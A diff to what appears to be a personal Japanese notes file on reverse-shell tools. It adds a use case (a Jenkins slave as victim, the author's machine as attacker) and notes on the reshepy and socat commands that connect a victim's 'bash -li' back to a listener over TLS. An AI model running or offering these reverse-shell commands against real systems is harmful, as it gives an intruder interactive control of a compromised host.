@@ -2,6 +2,10 @@
 
 * [Reverse Shell \(リバースシェル\) 入門 & 実践 \- 好奇心の足跡]( https://kusuwada.hatenablog.com/entry/2019/10/30/044325 )
 
+## use case
+* 任意のコマンドを実行できるサーバであるが，インタラクティブな操作ができない場合
+  * jenkinsのslave(victim) <-> my machine(attacker)
+
 ## how to install
 ```
 # for avoiding 'pip Installing collected packages: UNKNOWN'
@@ -132,11 +136,14 @@ socat openssl-connect:localhost:8080,verify=0 exec:'bash -li',pty,stderr,setsid,
 ```
 より安全に通信したい場合には`verify=1`とする?
 
+* client側が適切なサーバかどうかを判定する処理
+  * (ctrl-cやtab ok)
 ```
 reshepy -c cert.pem --host=www.localhost.com localhost:8080
 ```
-client側が適切なサーバかどうかを判定する処理
-(ctrl-cやtab ok)
+* 上記のコマンドのcert.pemに該当する部分をbase64でencodeしてテキストベースで貼り付ければ余計なファイルは不要な状態となる
+  * また，基本的に，victimが変なサーバに接続することを防止できれば，attackerが変なクライアントを受け入れてもそれほど問題はない
+    * (attacker側はコマンドの送信と表示のみであることと，ユースケースとしてネットワーク的に外からのアクセスは受け付けない場所にあると仮定されるため)
 
 ----
 
